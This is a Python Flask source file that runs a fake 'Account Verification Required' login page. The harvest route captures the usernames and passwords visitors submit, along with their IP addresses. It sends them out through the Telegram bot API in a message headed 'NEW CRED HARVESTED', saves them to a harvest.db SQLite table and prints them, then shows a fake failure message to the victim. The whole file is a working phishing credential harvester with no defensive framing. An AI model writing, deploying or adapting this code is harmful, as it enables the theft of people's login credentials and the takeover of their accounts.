from flask import Flask, request, render_template_string
import sqlite3
import datetime
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>Secure Login - Update Required</title></head>
<body>
<h1>Account Verification Required</h1>
<form method="POST">
    <input type="text" name="username" placeholder="Email or Username" required><br>
    <input type="password" name="password" placeholder="Password" required><br>
    <button type="submit">Verify Now</button>
</form>
</body>
</html>
'''

def send_telegram(username, password, ip):
    if not BOT_TOKEN or not CHAT_ID:
        return
    text = f"""🔐 NEW CRED HARVESTED
Time: {datetime.datetime.now()}
IP: {ip}
User: {username}
Pass: {password}"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': text}
    try:
        requests.post(url, data=payload, timeout=5)
    except:
        pass

@app.route('/', methods=['GET', 'POST'])
def harvest():
    if request.method == 'POST':
        user = request.form.get('username', '')
        pwd = request.form.get('password', '')
        ip = request.remote_addr
        ts = datetime.datetime.now()
        
        send_telegram(user, pwd, ip)
        
        try:
            conn = sqlite3.connect('harvest.db')
            conn.execute("INSERT INTO creds VALUES (?,?,?,?)", (str(ts), ip, user, pwd))
            conn.commit()
            conn.close()
        except:
            pass
        
        print(f"[HARVEST] {ts} | IP: {ip} | User: {user} | Pass: {pwd}")
        return "Verification failed. Try again later."
    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    conn = sqlite3.connect('harvest.db')
    conn.execute('''CREATE TABLE IF NOT EXISTS creds (time TEXT, ip TEXT, user TEXT, pass TEXT)''')
    conn.close()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
